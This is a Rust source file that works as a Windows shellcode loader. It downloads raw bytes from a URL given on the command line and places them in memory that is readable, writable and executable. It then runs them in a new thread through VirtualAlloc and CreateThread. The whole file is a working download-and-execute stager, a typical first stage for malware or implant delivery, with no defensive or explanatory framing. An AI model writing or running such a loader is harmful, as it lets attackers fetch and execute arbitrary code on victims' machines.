

use bindings::{
    Windows::Win32::System::Memory::{VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS,VirtualAlloc,VirtualFree},
    Windows::Win32::{Foundation::HANDLE, System::{Memory::VIRTUAL_FREE_TYPE, Threading::{CreateThread,ResumeThread,WaitForSingleObject,THREAD_CREATION_FLAGS}}}
};


use std::{env, ffi::c_void, mem, ptr};
type Result<T> = std::result::Result<T, Box<dyn std::error::Error + Send + Sync>>;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const MEM_COMMIT: u32 = 0x1000;
pub const MEM_RESERVE: u32 = 0x2000;
pub const MEM_RELEASE: u32 = 0x80;



#[tokio::main]
async fn main() -> windows::Result<()> {

    let args: Vec<String> = env::args().collect();

    let url = &args[1];
    execute_shellcode(url.to_string()).await.unwrap();
    Ok(())
}

async fn execute_shellcode(url: String) -> Result<()> {

    let response = reqwest::get(url).await?;
    let sc = response.bytes().await?;

   unsafe{

        let base_address = VirtualAlloc(
            ptr::null_mut(),
            sc.len() + 1,
            VIRTUAL_ALLOCATION_TYPE::from(MEM_COMMIT | MEM_RESERVE),
            PAGE_PROTECTION_FLAGS::from(PAGE_EXECUTE_READWRITE)
        );

        if base_address == ptr::null_mut(){
            println!("Null pointer!");
        }

        let base_address_ptr: *mut u8 = base_address as *mut u8;

        std::ptr::copy_nonoverlapping(sc.as_ptr(), base_address_ptr, sc.len());

        let entry_point: unsafe extern "system" fn(*mut c_void) -> u32 = mem::transmute(base_address);

        let mut thread_id = 0;

        let thread = CreateThread(
            ptr::null_mut(), 
            0, 
            Some(entry_point), 
            ptr::null_mut(), 
            THREAD_CREATION_FLAGS::from(0), 
            &mut thread_id
        );

        if HANDLE::is_null(&thread) {
            VirtualFree(base_address, sc.len(), VIRTUAL_FREE_TYPE::from(MEM_RELEASE));
            println!("[!!] Error while creating thread...");

        } else {
            
            println!("[+] Thread {} created.", thread_id);
            println!("[+] Entry point: 0x{:x}.", base_address as i64);
        }

        /*let _input: Option<i32> = std::io::stdin()
        .bytes()
        .next()
        .and_then(|result| result.ok())
        .map(|byte| byte as i32);

        ResumeThread(thread);*/

        WaitForSingleObject(thread,u32::MAX);

   }

   Ok(())
}

